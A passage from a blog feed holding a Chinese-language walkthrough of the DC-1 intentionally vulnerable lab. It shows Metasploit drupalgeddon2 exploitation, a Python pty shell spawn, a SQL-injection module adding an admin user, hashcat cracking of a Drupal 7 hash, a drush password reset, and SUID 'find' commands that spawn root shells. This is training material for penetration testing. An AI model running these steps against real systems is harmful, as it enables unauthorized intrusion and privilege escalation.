class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Description&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;就像DC-1一样，DC-2是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;As with the original DC-1, it&amp;#39;s designed with beginners in mind.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;与DC-1，它的设计充分考虑初学者。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;需要具备Linux技能并熟悉Linux命令行，以及一些基本渗透测试工具。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Just like with DC-1, there are five flags including the final flag.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;与DC-1一样，共有包括final flag在内的5个flag。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;同样，就像DC-1一样，flag对于初学者来说很重要，但对有经验的人则不那么重要。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;In short, the only flag that really counts, is the final flag.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;简而言之，唯一真正重要的flag是final flag。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;对于初学者来说，Google是您的朋友。 好吧，除了所有的隐私问题等等。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;I haven&amp;#39;t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;我没有探索获取root权限的所有方法，因为我废弃了我一直在使用的先前版本，并且除了基本的OS安装之外，还开始全新的学习。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Pentest" scheme="http://example.com/categories/Pentest/"/>
    
    
    <category term="Pentest" scheme="http://example.com/tags/Pentest/"/>
    
    <category term="DC" scheme="http://example.com/tags/DC/"/>
    
    <category term="Walkthrough" scheme="http://example.com/tags/Walkthrough/"/>
    
  </entry>
  
  <entry>
    <title>Walkthrough for DC-01</title>
    <link href="http://example.com/2021/04/22/DC-01/"/>
    <id>http://example.com/2021/04/22/DC-01/</id>
    <published>2021-04-22T07:25:38.000Z</published>
    <updated>2021-04-24T12:02:38.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Walkthrough-for-DC-01"><a href="#Walkthrough-for-DC-01" class="headerlink" title="Walkthrough for DC-01"></a>Walkthrough for DC-01</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line">简介</span><br><span class="line"></span><br><span class="line">DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</span><br><span class="line">DC-1是为增长渗透测试经验而搭建的渗透测试靶机。</span><br><span class="line"></span><br><span class="line">It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</span><br><span class="line">它设计给新手，但它的难度取决于你的知识与技能、以及学习能力。</span><br><span class="line"></span><br><span class="line">To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</span><br><span class="line">你需要linux技能（熟悉linux命令行）、基本的渗透测试工具（Kali Linux预装工具或Parrot Security OS）。</span><br><span class="line"></span><br><span class="line">There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</span><br><span class="line">有很多种提权方法，不过，我在靶机中放置了一些flag作为给新手的提示。</span><br><span class="line"></span><br><span class="line">There are five flags in total, but the ultimate goal is to find and read the flag in root&#39;s home directory. You don&#39;t even need to be root to do this, however, you will require root privileges.</span><br><span class="line">一共有5个flag，但最终目标是读取root目录下的flag。你甚至不需要root账号，但至少需要root权限。</span><br><span class="line"></span><br><span class="line">Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</span><br><span class="line">如果你够强，你或许会跳过大多数flag直冲root。</span><br><span class="line"></span><br><span class="line">Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</span><br><span class="line">新手或许会遭遇到从来没有遇见过的挑战，去谷歌搜吧。</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.five86.com/dc-1.html">https://www.five86.com/dc-1.html</a></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>打开一个win虚拟机，netsparker先扫着。</p><p>另一边开一个Kali，nmap扫描端口。</p><p><img src="https://i.loli.net/2021/04/22/OSVYN6UytJ7WzrP.png" alt="Nmap扫描结果"></p><p>看到有一个80端口上运行的是Apache，打开网页看看。</p><p><img src="https://i.loli.net/2021/04/22/YhDXCL9gpEOF5NB.png" alt="Drupal"></p><p>是个Drupal搭建的网站，上面扫描爆出来网站有robots文件，打开看一下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> robots.txt</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This file is to prevent the crawling and indexing of certain parts</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> of your site by web crawlers and spiders run by sites like Yahoo!</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and Google. By telling these <span class="string">&quot;robots&quot;</span> <span class="built_in">where</span> not to go on your site,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> you save bandwidth and server resources.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This file will be ignored unless it is at the root of your host:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Used:    http://example.com/robots.txt</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Ignored: http://example.com/site/robots.txt</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> For more information about the robots.txt standard, see:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> http://www.robotstxt.org/wc/robots.html</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> For syntax checking, see:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> http://www.sxw.org.uk/computing/robots/check.html</span></span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"><span class="meta">#</span><span class="bash"> Directories</span></span><br><span class="line">Disallow: /includes/</span><br><span class="line">Disallow: /misc/</span><br><span class="line">Disallow: /modules/</span><br><span class="line">Disallow: /profiles/</span><br><span class="line">Disallow: /scripts/</span><br><span class="line">Disallow: /themes/</span><br><span class="line"><span class="meta">#</span><span class="bash"> Files</span></span><br><span class="line">Disallow: /CHANGELOG.txt</span><br><span class="line">Disallow: /cron.php</span><br><span class="line">Disallow: /INSTALL.mysql.txt</span><br><span class="line">Disallow: /INSTALL.pgsql.txt</span><br><span class="line">Disallow: /INSTALL.sqlite.txt</span><br><span class="line">Disallow: /install.php</span><br><span class="line">Disallow: /INSTALL.txt</span><br><span class="line">Disallow: /LICENSE.txt</span><br><span class="line">Disallow: /MAINTAINERS.txt</span><br><span class="line">Disallow: /update.php</span><br><span class="line">Disallow: /UPGRADE.txt</span><br><span class="line">Disallow: /xmlrpc.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> Paths (clean URLs)</span></span><br><span class="line">Disallow: /admin/</span><br><span class="line">Disallow: /comment/reply/</span><br><span class="line">Disallow: /filter/tips/</span><br><span class="line">Disallow: /node/add/</span><br><span class="line">Disallow: /search/</span><br><span class="line">Disallow: /user/register/</span><br><span class="line">Disallow: /user/password/</span><br><span class="line">Disallow: /user/login/</span><br><span class="line">Disallow: /user/logout/</span><br><span class="line"><span class="meta">#</span><span class="bash"> Paths (no clean URLs)</span></span><br><span class="line">Disallow: /?q=admin/</span><br><span class="line">Disallow: /?q=comment/reply/</span><br><span class="line">Disallow: /?q=filter/tips/</span><br><span class="line">Disallow: /?q=node/add/</span><br><span class="line">Disallow: /?q=search/</span><br><span class="line">Disallow: /?q=user/password/</span><br><span class="line">Disallow: /?q=user/register/</span><br><span class="line">Disallow: /?q=user/login/</span><br><span class="line">Disallow: /?q=user/logout/</span><br></pre></td></tr></table></figure><p>大概翻了一下，看到UPGRADE.txt里面有这么一行。估计这应该是个7.x或者6.x的Drupal。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">INTRODUCTION</span><br><span class="line">------------</span><br><span class="line">This document describes how to:</span><br><span class="line"></span><br><span class="line">  * Update your Drupal site from one minor 7.x version to another minor 7.x</span><br><span class="line">    version; for example, from 7.8 to 7.9, or from 7.6 to 7.10.</span><br><span class="line"></span><br><span class="line">  * Upgrade your Drupal site&#39;s major version from 6.x to 7.x.</span><br></pre></td></tr></table></figure><p>上Metasploit，看看有没有和Drupal相关的EXP。</p><p><img src="https://i.loli.net/2021/04/22/Ks5LpNyHklZhiBv.png" alt="drupal模块"></p><p>此时netsparker也扫出来一些东西。</p><p><img src="https://i.loli.net/2021/04/22/76Pdr5JspjoHvWG.png" alt="扫描差不多了"></p><p>试用了几个drupal模块，发现使用drupal_drupalgeddon2可以进入meterpreter交互模式。</p><p><img src="https://i.loli.net/2021/04/22/kdI2zoTsuGEj4WL.png" alt="拿到shell"></p><p>然后找到flag1.txt</p><p><img src="https://i.loli.net/2021/04/22/rYXSa8NxZjHcw3m.png" alt="image-20200818113045668"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>根据flag1的提示，我们要找drupal的配置文件。感谢万能的谷歌。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">settings.php</span><br><span class="line">$settings[<span class="string">&#x27;file_public_path&#x27;</span>] = <span class="string">&#x27;sites/default/files&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/22/aPXpR2SUOQ7DrCe.png" alt="image-20200818113348603"></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>在flag2之后有一个数据库的密码和账号。</p><p><img src="https://i.loli.net/2021/04/22/a3UVbrT4HSK69yR.png" alt="image-20200818114305791"></p><p>获取shell，登陆一下mysql试试。</p><p><img src="https://i.loli.net/2021/04/22/S5fZ89NypsXn4Ba.png" alt="image-20200818114554970"></p><p>然而没有正常回显信息，原因不明。</p><blockquote><p>后来看了官方的walkthrough，也没有说明此处mysql为什么没有回显。大概是限制了某些进程的回显？</p></blockquote><p>测试一下服务器有没有配置python环境。</p><p><img src="https://i.loli.net/2021/04/22/Qmuq5tM8YX6JAEe.png" alt="image-20200818115039622"></p><p>发现了python2，尝试通过python获取一个pty。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/22/oCLeK5xrcWF2lER.png" alt="image-20200818115633785"></p><p>成功登录mysql，获取回显。</p><p><img src="https://i.loli.net/2021/04/22/dMmqljEuvxVtKyX.png" alt="image-20200818115855568"></p><p><img src="https://i.loli.net/2021/04/22/89v7K3R2L6nEw5s.png" alt="image-20200818115934447"></p><p><img src="https://i.loli.net/2021/04/22/P6jVUQioaFRfzWX.png" alt="image-20200818120006057"></p><p>查看users表。</p><p><img src="https://i.loli.net/2021/04/22/ZVGRH36KpFkOYwg.png" alt="image-20200818120146011"></p><blockquote><p>users表中原本只有前两行数据，后面的数据是我在做题的过程中加进去的。</p></blockquote><h3 id="世界线一"><a href="#世界线一" class="headerlink" title="世界线一"></a>世界线一</h3><p>回到metasploit，搜索一下有没有关于在drupal中获取admin权限的脚本。</p><p><img src="https://i.loli.net/2021/04/22/zNZJWchfajC97qA.png" alt="image-20210422101916951"></p><p>发现了一个适用于<code>drupal 7.0 &lt;  7.31</code>的添加admin用户的sql注入脚本。运行，成功添加了admin用户。</p><p><img src="https://i.loli.net/2021/04/22/xd3oLFbZqpDKGfn.png" alt="image-20210422103109153"></p><p>然后在dashboard中找到了flag3。</p><p><img src="https://i.loli.net/2021/04/22/zuVTE6YlS1HKAbg.png" alt="image-20210422103300919"></p><h3 id="世界线二"><a href="#世界线二" class="headerlink" title="世界线二"></a>世界线二</h3><p>做完题后突然想起来，mysql数据库user表里的password字段的加密方式以前似乎从来没有见过。在谷歌上稍微搜了一下，发现原来是Drupal的一种特殊格式。</p><blockquote><p>Drupal7默认使用SHA512+salt。 通过PHP的哈希函数运行哈希，以增加生成密码最终哈希的安全性。该实现分为两个全局函数：<code>user_hash_password()</code>和<code>_password_crypt()</code>。</p><p>这是Drupal 7中的示例哈希：</p><ul><li><p><code>$S$Dxl65W9p07LfQU7jvy5CnsyDpMoLujiAgzy123khcg1OJi/P9pKS</code></p></li><li><p>字符0-2是类型（<code>$S$</code>是Drupal7）</p></li><li><p>字符3是基于char在此列表中的位置的log2回合数(X)：<code>./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</code>。因此，在示例中，“ D”将映射到15</p></li><li><p>字符4-11是SALT</p></li><li><p>其余的是使用2^X个回合的SHA512。</p></li><li><p>然后使用base64将二进制结果转换为字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$count = <span class="number">1</span> &lt;&lt; $count_log2;</span><br><span class="line"> $hash = hash($algo,$salt,$password,<span class="literal">true</span>);</span><br><span class="line"> <span class="keyword">do</span> &#123; $hash = hash($algo,$hash,$password,<span class="literal">TRUE</span>);</span><br><span class="line"> &#125; <span class="keyword">while</span>( --$count);</span><br></pre></td></tr></table></figure><p>整个过程可以在以下位置找到：<code>mydrupalsite\includes\password.inc</code></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="function"><span class="keyword">function</span> <span class="title">user_check_password</span>(<span class="params">$password, $account</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (substr($account-&gt;pass, <span class="number">0</span>, <span class="number">2</span>) == <span class="string">&#x27;U$&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// This may be an updated password from user_update_7000(). Such hashes</span></span><br><span class="line">    <span class="comment">// have &#x27;U&#x27; added as the first character and need an extra md5().</span></span><br><span class="line">    $stored_hash = substr($account-&gt;pass, <span class="number">1</span>);</span><br><span class="line">    $password = md5($password);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    $stored_hash = $account-&gt;pass;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $type = substr($stored_hash, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">switch</span> ($type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;$S$&#x27;</span>:</span><br><span class="line">      <span class="comment">// A normal Drupal 7 password using sha512.</span></span><br><span class="line">      $hash = _password_crypt(<span class="string">&#x27;sha512&#x27;</span>, $password, $stored_hash);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;$H$&#x27;</span>:</span><br><span class="line">      <span class="comment">// phpBB3 uses &quot;$H$&quot; for the same thing as &quot;$P$&quot;.</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;$P$&#x27;</span>:</span><br><span class="line">      <span class="comment">// A phpass password generated using md5.  This is an</span></span><br><span class="line">      <span class="comment">// imported password or from an earlier Drupal version.</span></span><br><span class="line">      $hash = _password_crypt(<span class="string">&#x27;md5&#x27;</span>, $password, $stored_hash);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ($hash &amp;&amp; $stored_hash == $hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>既然如此，应该可以用hashcat爆破。</p><p>在hashcat的module中搜索了一下，发现还真有针对drupal7的爆破模块。</p><p><img src="https://i.loli.net/2021/04/22/tTjzClS2ihYeZNp.png" alt="image-20210422104454889"></p><p>从users表中取出admin的密码，用hashcat跑一下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 7900 -a 0 ./pass.txt ./dict.dic</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/22/jc6HJ54aolqGFWt.png" alt="image-20210422113147583"></p><p>跑出来密码是<code>53cr3t</code>。用管理员账号登录之后，在dashboard看到flag。</p><h3 id="世界线三"><a href="#世界线三" class="headerlink" title="世界线三"></a>世界线三</h3><p>然而，在搜索关于drupal的密码时，一不小心看到了<code>how to reset drupal7 admin password</code>的提问，点开看了看，发现有一个专门用于管理drupal的shell接口，可以用于修改用户账号。</p><p>在pty中，使用drush将admin的密码修改为admin。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=&quot;admin&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/22/tKNS1HG8uxM6hBo.png" alt="image-20210422114724499"></p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>根据flag3的提示，去谷歌了一下<code>linux perm su</code>，发现一个关于<code>SUID</code>的提权方式。</p><blockquote><p>文件权限除了r、w、x外还有==s==、t、i、a权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s权限，设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份。</span><br><span class="line">t权限，针对目录，任何用户都可以在此目录中创建文件，但只能删除自己的文件。</span><br><span class="line">i权限，不可修改的权限。</span><br><span class="line">a权限，只追加的权限。</span><br></pre></td></tr></table></figure><p><strong>SUID</strong><br> 当执行的文件被赋予了s权限，就被称为Set UID，简称为SUID的特殊权限。八进制数为4000。</p><ul><li>SUID权限仅对二进制程序有效</li><li>执行该程序必须具有x的执行权限，否则s权限并不能真正生效</li><li>本权限仅在执行该程序的过程中有效，拥有临时身份</li><li>执行者将具有该程序拥有者(owner)的权限</li></ul><p><strong>查找具有SUID权限的文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line">-perm 表示搜索随后的权限</span><br><span class="line">-u=s表示查找root用户拥有的文件</span><br><span class="line">-type表示我们正在寻找的文件类型</span><br><span class="line">f 表示常规文件，而不是目录或特殊文件</span><br><span class="line">2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">表示重定向</span></span><br><span class="line">/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure><p>还有额外的几个命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; </span><br></pre></td></tr></table></figure><p>详见：<a href="https://www.jianshu.com/p/5ac4602b14c6">linux 提权-SUID提权</a></p></blockquote><p>找到具有root的SUID的文件。</p><p><img src="https://i.loli.net/2021/04/22/IDLMJ9cyxhQnkjr.png" alt="image-20210422120124397"></p><p>文章中给了一个可以查找SUID利用方式的网页 <a href="https://gtfobins.github.io/">GTFObins</a> ,挨个搜索，发现find有利用方法：</p><blockquote><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>It can be used to break out from restricted environments by spawning an interactive system shell.<br>它可以通过生成交互式系统外壳程序来脱离受限环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure><h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><p>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run <code>sh -p</code>, omit the <code>-p</code> argument on systems like Debian (&lt;= Stretch) that allow the default <code>sh</code> shell to run with SUID privileges.<br>如果二进制文件有SUID，则它存在提升的特权，并且可能被滥用来访问文件系统、提权或维护特权访问（作为SUID后门）。 如果用于运行<code>sh -p</code>（请在Debian（&lt;= Stretch）之类的系统上省略<code>-p</code>参数），该参数允许默认的<code>sh</code> 以SUID特权运行。</p><p>This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.<br>本示例创建二进制文件的本地SUID副本并运行它以维护提升的特权。 要与现有的SUID二进制文件进行交互，请跳过第一个命令，并使用其原始路径运行该程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo install -m =xs $(which find) .</span><br><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure><h2 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a>Sudo</h2><p>If the binary is allowed to run as superuser by <code>sudo</code>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.<br>如果二进制文件被sudo允许以超级用户身份运行，它存在提升的特权，并且可以用于访问文件系统、提权或维护特权访问。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure></blockquote><p>使用提供的命令，成功提权。</p><p><img src="https://i.loli.net/2021/04/22/7DNHYgJpjn4udlA.png" alt="image-20210422121145817"></p><p>然后找了一圈，最后在<code>/home/flag4</code>找到了flag4。</p><p><img src="https://i.loli.net/2021/04/22/oUk3tlg9Rju2JdP.png" alt="image-20210422121517421"></p><p>然后突然意识到，似乎拿flag4并不需要提权……在www-data用户下用find指令搜索也能拿到flag4。</p><p><img src="https://i.loli.net/2021/04/22/Xg1doQNpAm5Y8Ov.png" alt="image-20210422121702440"></p><h2 id="the-final-flag"><a href="#the-final-flag" class="headerlink" title="the final flag"></a>the final flag</h2><p>已经获取了root权限，按照靶机描述，cd进<code>/root</code>读取flag。</p><p><img src="https://i.loli.net/2021/04/22/PCGj82zIuTyE9bp.png" alt="image-20210422122008689"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Walkthrough-for-DC-01&quot;&gt;&lt;a href=&quot;#Walkthrough-for-DC-01&quot; class=&quot;headerlink&quot; title=&quot;Walkthrough for DC-01&quot;&gt;&lt;/a&gt;Walkthrough for DC-01&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span 